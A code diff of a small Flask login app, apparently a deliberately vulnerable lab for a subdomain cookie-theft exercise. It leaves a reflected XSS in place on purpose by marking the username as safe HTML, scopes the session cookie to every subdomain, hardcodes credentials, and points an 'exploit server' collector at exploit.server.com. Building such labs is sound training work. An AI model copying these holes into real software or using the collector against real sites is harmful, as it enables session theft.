@@ -1,3 +1,4 @@
+#secret/app.py
 from flask import Flask, request, render_template, make_response
 from markupsafe import Markup
 
@@ -5,7 +6,7 @@ app = Flask(__name__, template_folder=".")
 app.secret_key = "sibling-secret-key"
 
 users = {
-    "admin": "1P4sSW0rD",
+    "admin": "p4sSw0Rd",
     "guest": "guest"
 }
 
@@ -19,7 +20,14 @@ def login():
     if username:
         if username in users and users[username] == password:
             resp = make_response(f"Welcome {username}!")
-            resp.set_cookie("session", f"{username}-session-value", httponly=True, samesite="Strict")
+            resp.set_cookie(
+            "session",
+            f"{username}-session-value",
+            httponly=True,
+            samesite="Strict",
+            domain=".cds.com"   # 모든 서브도메인에서 접근 가능
+        )
+
             return resp
         else:
             error = f"Invalid login for user: {username}"
@@ -27,7 +35,7 @@ def login():
     # 현재 요청 호스트/포트 기준으로 exploit 서버 URL 동적 생성
     scheme = request.scheme
     host = request.host.split(':')[0]  # 호스트만
-    exploit_server_url = f"{scheme}://{host}:8000/collect"
+    exploit_server_url = f"{scheme}://exploit.server.com:8000/collect"
 
     # username을 HTML에서 스크립트 실행 가능하도록 safe 처리
     safe_username = Markup(username)
@@ -38,4 +46,4 @@ def login():
                            username=safe_username)
 
 if __name__ == "__main__":
-    app.run(host="0.0.0.0", port=5001, debug=True)
+    app.run(host="0.0.0.0", port=777, debug=False)
